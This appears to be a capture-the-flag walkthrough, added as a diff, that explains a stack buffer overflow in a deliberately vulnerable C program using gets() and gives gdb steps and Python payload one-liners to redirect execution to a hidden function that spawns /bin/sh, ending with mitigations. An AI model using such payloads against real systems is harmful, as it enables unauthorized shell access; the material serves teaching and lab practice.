@@ -1,0 +1,146 @@
+# Exploiting a Vulnerability in a C Program
+
+## Code Under Analysis
+
+The program contains the following code:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+void run(void)
+{
+  fwrite("Good... Wait what?\n",1,0x13,stdout);
+  system("/bin/sh");
+  return;
+}
+
+void main(void)
+{
+  char buffer[76];
+  
+  gets(buffer);
+  return;
+}
+```
+
+## Vulnerability Overview
+
+The `run` function is defined in the program but is never called directly. This function executes a shell command (`/bin/sh`) and could potentially allow unauthorized access if it were executed. However, since `run` is not invoked anywhere in the code, how can it possibly be executed?
+
+To understand how we can exploit this program, we need to delve into how the program determines which functions to call and where to continue execution after a function has returned.
+
+---
+
+## Stack Frame and Function Calls
+
+When a program runs, the CPU maintains a *call stack* to manage function calls and returns. This call stack records essential information about the execution flow, such as where to return once a function finishes and the local variables of a function. The stack operates in a **last-in, first-out** (LIFO) manner.
+
+### Example: Function Call Sequence
+Consider the following pseudocode:
+```
+main:
+    sum_two_ints
+    print_res
+        write_str
+        write_int
+    write_str
+```
+Here’s how the program executes:
+1. `main` is called first.
+2. `main` calls `sum_two_ints` and waits for it to return.
+3. After `sum_two_ints` finishes, execution continues in `main`.
+4. Similarly, `print_res` is called, which itself calls `write_str` and `write_int`, and so on.
+
+### Stack Frame Components
+
+When a function is called, a *stack frame* is created to store:
+- **Return Address**: The address of the next instruction in the caller function. This tells the program where to continue execution after the called function returns.
+- **Local Variables**: Variables defined inside the function, stored temporarily on the stack.
+- **Saved Registers**: Some architectures save specific registers (like the base pointer) to maintain the stack structure.
+
+In modern x86 systems, the **Instruction Pointer (EIP)** register determines the next instruction to execute. The return address saved in the stack is eventually loaded into the `EIP` when a function returns, dictating the flow of execution.
+
+---
+
+## Exploiting the Vulnerability
+
+The program uses the unsafe function `gets()` to read input into the `buffer` buffer. However, `gets()` has no bounds checking, meaning that if the input exceeds the size of `buffer` (76 bytes in this case), it will overwrite adjacent memory.
+
+### Memory Layout Near `buffer`
+The memory layout in the function `main` might look like this:
+
+| Memory Address       | Content                    |
+|----------------------|----------------------------|
+| `buffer` (76 bytes)| Buffer for user input      |
+| Saved Registers      | Base Pointer and others    |
+| **Return Address**   | Points back to caller code |
+
+If we input more than 76 bytes, the excess data will overwrite the saved registers and the **return address**. By carefully crafting the input, we can overwrite the return address to point to the `run` function.
+
+### Steps to Exploit: Buffer Overflow
+1. **Determine the Offset**:
+   - First, calculate how many bytes are needed to overwrite the return address. In this case, the offset is 76 bytes, as `buffer` occupies 76 bytes on the stack.
+2. **Find the Address of `run`**:
+   - Use tools like `gdb` to find the memory address of the `run` function in the binary. Let's assume this address is `0x42424242`.
+3. **Craft Malicious Input**:
+   - Construct an input payload:
+     - 76 bytes of filler data (to fill `buffer`).
+     - Overwrite the return address with the address of `run`.
+   - The payload might look like this:
+     ```
+     "A" * 76 + "\x42\x42\x42\x42" (in little-endian format)
+     ```
+4. **Trigger the Overflow**:
+   - Provide the crafted input to the program via standard input.
+
+When the `gets()` function copies this input into `buffer`, it overwrites the return address. Upon returning from `main`, the program jumps to the `run` function, which executes `/bin/sh` and grants shell access.
+
+---
+
+## Exploit Execution in Detail
+
+1. **Run and Debug**:
+   - Use `gdb` to inspect the stack and determine the exact memory layout:
+     ```bash
+     gdb ./level1
+     i func
+     ...
+     0x08048444  run
+     ...
+     ```
+
+2. **Craft the Payload**:
+   - Generate the payload with the correct filler and address of `run`.
+   python -c 'print("A"*76 + "\x44\x84\x04\x08")'
+
+3. **Execute the Exploit**:
+   - Feed the payload to the program:
+     ```bash
+     python -c 'print("A"*76 + "\x44\x84\x04\x08")' > /tmp/exploit
+	  cat /tmp/exploit - | ./level1
+     ```
+     or
+     ```
+     (python -c 'print("A"*76 + "\x44\x84\x04\x08")'); cat - | ./level1
+     ```
+
+4. **Gain Access**:
+   - Upon successful execution, the program spawns a shell.
+
+---
+
+## Mitigation Strategies
+
+1. **Avoid Unsafe Functions**:
+   - Replace `gets()` with safer alternatives like `fgets()`.
+
+2. **Enable Compiler Protections**:
+   - Use stack canaries and non-executable stacks (`-z noexecstack`).
+
+3. **Perform Bounds Checking**:
+   - Always validate input lengths before copying into buffers.
+
+4. **Address Space Layout Randomization (ASLR)**:
+   - Randomize memory layouts to make it harder for attackers to predict addresses.
+
